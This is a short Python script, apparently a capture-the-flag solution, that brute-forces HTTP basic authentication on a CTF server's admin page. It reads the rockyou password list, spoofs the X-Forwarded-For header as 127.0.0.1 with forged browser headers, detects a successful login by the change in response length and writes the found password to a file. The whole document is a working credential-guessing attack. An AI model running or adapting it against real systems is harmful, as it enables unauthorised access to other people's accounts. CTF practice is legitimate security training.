import requests
import numpy as np
from multiprocessing import Process
tn = 1
lines = open("./debug/rockyou.txt", "r", encoding="latin-1").readlines()
splits = np.array_split(lines, tn)


def request(i):
    lines = splits[i]
    for idx, pw in enumerate(lines):
        _pw=pw
        while 1:
            try:
                r = requests.get('http://ctf.adl.tw:12002/admin',
                                 headers={"X-Forwarded-For": "127.0.0.1",
                                          "User-Agent": "STARRYBrowser",
                                          "Accept-Language": "ja-JP"}, auth=("bocchi", _pw))
                break
            except:
                None
        if len(r.text) != 1370:
            print(_pw)
            with open('pw.txt', 'w') as f:
                f.write(_pw)
            exit()
        if idx % 1000 == 0:
            print("pid : %d , idx : %d" % (i, idx))


for i in range(tn):
    p = Process(target=request, args=(i,))
    p.start()